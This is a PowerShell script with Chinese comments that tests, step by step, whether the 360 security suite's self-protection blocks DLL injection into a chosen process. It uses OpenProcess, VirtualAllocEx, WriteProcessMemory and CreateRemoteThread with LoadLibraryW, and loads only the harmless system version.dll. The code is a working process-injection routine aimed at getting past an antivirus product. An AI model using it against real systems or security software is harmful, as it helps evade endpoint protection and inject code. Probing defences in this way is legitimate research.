# 逐步验证进程内注入是否被 360 自我保护拦截
#
# ============================================================================
# 上轮发现：360 自我保护阻止外部枚举（tasklist=N/A, WMI 空路径, Modules=0）
# 本轮：逐步测试注入所需的每个 API，精确定位拦截点。
#
# 步骤:
#   1. OpenProcess(PROCESS_ALL_ACCESS)      -> 是否成功
#   2. OpenProcess(PROCESS_VM_READ)         -> 是否成功（较低权限）
#   3. VirtualAllocEx                       -> 是否成功
#   4. WriteProcessMemory                   -> 是否成功
#   5. CreateRemoteThread + LoadLibraryW    -> 是否成功
#   6. 验证 DLL 是否真的加载了
#
# 目标: -Pid N
# ============================================================================

param([int]$TargetPid)

if (-not $TargetPid) { $TargetPid = 48048 }

$sig = @"
using System;
using System.Runtime.InteropServices;
public static class INJ {
  [DllImport("kernel32.dll", SetLastError=true)]
  public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
  [DllImport("kernel32.dll", SetLastError=true)]
  public static extern bool CloseHandle(IntPtr h);
  [DllImport("kernel32.dll", SetLastError=true)]
  public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr addr, IntPtr size, uint type, uint protect);
  [DllImport("kernel32.dll", SetLastError=true)]
  public static extern bool VirtualFreeEx(IntPtr h, IntPtr addr, IntPtr size, uint type);
  [DllImport("kernel32.dll", SetLastError=true)]
  public static extern bool WriteProcessMemory(IntPtr h, IntPtr addr, byte[] buf, IntPtr size, out IntPtr written);
  [DllImport("kernel32.dll", SetLastError=true)]
  public static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, IntPtr size, out IntPtr read);
  [DllImport("kernel32.dll", SetLastError=true)]
  public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr attr, IntPtr stack, IntPtr start, IntPtr param, uint flags, out uint tid);
  [DllImport("kernel32.dll", SetLastError=true)]
  public static extern uint WaitForSingleObject(IntPtr h, uint ms);
  [DllImport("kernel32.dll", SetLastError=true)]
  public static extern bool GetExitCodeThread(IntPtr h, out uint code);
  [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode, EntryPoint="GetModuleHandleW")]
  public static extern IntPtr GetModuleHandleW(string n);
  [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Ansi, EntryPoint="GetProcAddress")]
  public static extern IntPtr GetProcAddress(IntPtr h, string n);
}
"@
Add-Type -TypeDefinition $sig -ErrorAction Stop

$PROCESS_ALL_ACCESS = 0x1F0FFF
$PROCESS_VM_READ    = 0x0010
$PROCESS_VM_WRITE   = 0x0020
$PROCESS_VM_OPERATION = 0x0008
$PROCESS_CREATE_THREAD = 0x0002
$PROCESS_QUERY_INFORMATION = 0x0400

$MEM_COMMIT  = 0x1000
$MEM_RESERVE = 0x2000
$MEM_RELEASE = 0x8000
$PAGE_READWRITE = 0x04

Write-Output ("  目标 PID = {0}" -f $TargetPid)

# --- 步骤 1: OpenProcess 全权限 ---
$h = [INJ]::OpenProcess($PROCESS_ALL_ACCESS, $false, $TargetPid)
$e1 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
Write-Output ("  [1] OpenProcess(ALL_ACCESS)      -> 0x{0:X8}  err={1}" -f $h.ToInt64(), $e1)

# --- 步骤 2: 低权限 ---
$low = $PROCESS_VM_READ -bor $PROCESS_VM_WRITE -bor $PROCESS_VM_OPERATION -bor $PROCESS_CREATE_THREAD -bor $PROCESS_QUERY_INFORMATION
$h2 = [INJ]::OpenProcess($low, $false, $TargetPid)
$e2 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
Write-Output ("  [2] OpenProcess(组合权限)        -> 0x{0:X8}  err={1}" -f $h2.ToInt64(), $e2)

if ($h -eq [IntPtr]::Zero -and $h2 -eq [IntPtr]::Zero) {
  Write-Output "  => OpenProcess 全部失败，后续步骤无法进行"
  exit 0
}
$hh = if ($h -ne [IntPtr]::Zero) { $h } else { $h2 }
Write-Output ("  使用句柄 0x{0:X8}" -f $hh.ToInt64())

# --- 步骤 3: VirtualAllocEx ---
$mem = [INJ]::VirtualAllocEx($hh, [IntPtr]::Zero, [IntPtr]4096, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
$e3 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
Write-Output ("  [3] VirtualAllocEx(4096)         -> 0x{0:X8}  err={1}" -f $mem.ToInt64(), $e3)

if ($mem -eq [IntPtr]::Zero) {
  Write-Output "  => VirtualAllocEx 失败，注入不可行"
  [void][INJ]::CloseHandle($hh)
  exit 0
}

# --- 步骤 4: WriteProcessMemory ---
$data = [System.Text.Encoding]::Unicode.GetBytes("DSH_INJECT_TEST")
$written = [IntPtr]::Zero
$ok4 = [INJ]::WriteProcessMemory($hh, $mem, $data, [IntPtr]$data.Length, [ref]$written)
$e4 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
Write-Output ("  [4] WriteProcessMemory({0} 字节) -> {1}  写入={2}  err={3}" -f $data.Length, $ok4, $written.ToInt64(), $e4)

# --- 步骤 5: ReadProcessMemory 验证 ---
$rb = New-Object byte[] $data.Length
$read = [IntPtr]::Zero
$ok5 = [INJ]::ReadProcessMemory($hh, $mem, $rb, [IntPtr]$data.Length, [ref]$read)
$e5 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
$rstr = [System.Text.Encoding]::Unicode.GetString($rb)
Write-Output ("  [5] ReadProcessMemory 验证        -> {0}  读回='{1}'  err={2}" -f $ok5, $rstr, $e5)

# --- 步骤 6: CreateRemoteThread + LoadLibraryW ---
$k32 = [INJ]::GetModuleHandleW("kernel32.dll")
$pLoad = [INJ]::GetProcAddress($k32, "LoadLibraryW")
Write-Output ("  [6] kernel32=0x{0:X8} LoadLibraryW=0x{1:X8}" -f $k32.ToInt64(), $pLoad.ToInt64())

# 在目标进程里分配路径字符串
$dllPath = "C:\Windows\System32\version.dll"
$pb = [System.Text.Encoding]::Unicode.GetBytes($dllPath + [char]0)
$pmem = [INJ]::VirtualAllocEx($hh, [IntPtr]::Zero, [IntPtr]$pb.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
$w2 = [IntPtr]::Zero
[void][INJ]::WriteProcessMemory($hh, $pmem, $pb, [IntPtr]$pb.Length, [ref]$w2)
Write-Output ("      路径已写入 0x{0:X8} ({1} 字节)" -f $pmem.ToInt64(), $w2.ToInt64())

$tid = 0
$th = [INJ]::CreateRemoteThread($hh, [IntPtr]::Zero, [IntPtr]::Zero, $pLoad, $pmem, 0, [ref]$tid)
$e6 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
Write-Output ("  [6] CreateRemoteThread(LoadLibraryW) -> 0x{0:X8}  tid={1}  err={2}" -f $th.ToInt64(), $tid, $e6)

if ($th -ne [IntPtr]::Zero) {
  $wr = [INJ]::WaitForSingleObject($th, 5000)
  $code = 0
  [void][INJ]::GetExitCodeThread($th, [ref]$code)
  Write-Output ("      等待={0}  线程退出码=0x{1:X8} (LoadLibrary 返回值)" -f $wr, $code)
  if ($code -ne 0) { Write-Output "      ★ DLL 加载成功！注入可行" }
  else { Write-Output "      DLL 加载返回 0（可能已加载或失败）" }
  [void][INJ]::CloseHandle($th)
} else {
  Write-Output "      ★ CreateRemoteThread 失败 —— 注入被拦截"
}

# 清理
[void][INJ]::VirtualFreeEx($hh, $mem, [IntPtr]::Zero, $MEM_RELEASE)
[void][INJ]::VirtualFreeEx($hh, $pmem, [IntPtr]::Zero, $MEM_RELEASE)
[void][INJ]::CloseHandle($hh)
Write-Output "  完成"